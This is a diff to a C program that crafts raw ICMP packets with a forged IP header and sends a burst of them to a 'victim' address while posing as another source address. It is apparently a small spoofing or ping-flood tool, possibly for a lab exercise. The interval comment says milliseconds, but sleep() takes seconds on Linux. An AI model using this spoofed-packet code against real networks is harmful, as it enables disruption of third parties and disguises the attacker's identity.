@@ -2,7 +2,7 @@
 
 #define MESSAGE_SIZE 17
 #define PACKAGE_AMOUNT 40
-#define TIME_INTERVAL 500	//ms
+#define TIME_INTERVAL 200	//ms
 
 int main(int argc, char **argv)
 {
@@ -28,12 +28,12 @@ int main(int argc, char **argv)
 
 	if ((victim_address = inet_addr(argv[1])) == INADDR_NONE)
 	{
-		die("Invalid address supplied", -1);
+		die("Invalid address", -1);
 	}
 
 	if ((pseudo_attacker_address = inet_addr(argv[2])) == INADDR_NONE)
 	{
-		die("Invalid subnet address supplied", -1);
+		die("Invalid subnet address", -1);
 	}
 
 	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == SOCKET_ERROR)
@@ -44,7 +44,7 @@ int main(int argc, char **argv)
 	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (const char*)&hdr_included, sizeof hdr_included) != 0)
 	{
 		die("Cannot setsockopt()", -2);
-	}// ?
+	}
 	
 	uint8_t *outPacket;
 	struct icmphdr *header_icmp;
@@ -58,7 +58,7 @@ int main(int argc, char **argv)
 	}
 
 	srand((unsigned int)time(NULL));
-	for (i = 0; i < MESSAGE_SIZE + sizeof(struct icmphdr); i++) outPacket[i] = rand() % 0xFF;
+	for (i = 0; i < MESSAGE_SIZE + sizeof(struct icmphdr) + sizeof(struct iphdr); i++) outPacket[i] = rand() % 0xFF;
 
 	header_ip = (struct iphdr*)outPacket;
 	header_icmp = (struct icmphdr*)(outPacket+sizeof(struct iphdr));
@@ -84,7 +84,7 @@ int main(int argc, char **argv)
 	//
 	for (i = 0; i < PACKAGE_AMOUNT; i++)
 	{
-		printf("ping from %s\t", inet_ntoa(*(struct in_addr*)&victim_address));
+		printf("ping from %s\n", inet_ntoa(*(struct in_addr*)&victim_address));
 		if (sendto(sock, (const char *)outPacket, sizeof(struct iphdr) + sizeof(struct icmphdr) + MESSAGE_SIZE, 0, (const struct sockaddr*)&addr, sizeof addr) == SOCKET_ERROR)
 			die("Cannot sendto()", -3);
 		sleep(TIME_INTERVAL);
@@ -97,20 +97,7 @@ int main(int argc, char **argv)
 void die(char *reason, int code)
 {
 #ifdef WIN32
-	DWORD error = GetLastError();
-	char *error_description=NULL, *error_description_oem=NULL;
-	if (FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&error_description, 0, 0) != 0)
-	{
-		error_description_oem = (char*)malloc(strlen(error_description)+1);
-		CharToOemA(error_description, error_description_oem);
-		HeapFree(GetProcessHeap(), 0, error_description);
-		fprintf(stderr, "%s, winerr %d: %s\n", reason, error, error_description_oem);
-		free(error_description_oem);
-	}
-	else
-	{
-		fprintf(stderr, "%s, winerr %d (FormatMessageA fail with winerr %d)", reason, error, GetLastError());
-	}
+    fprintf(stderr, "winerr %d", GetLastError());
 #elif __linux__
 	fprintf(stderr, "%s, errno %d\n", reason, errno);
 #endif
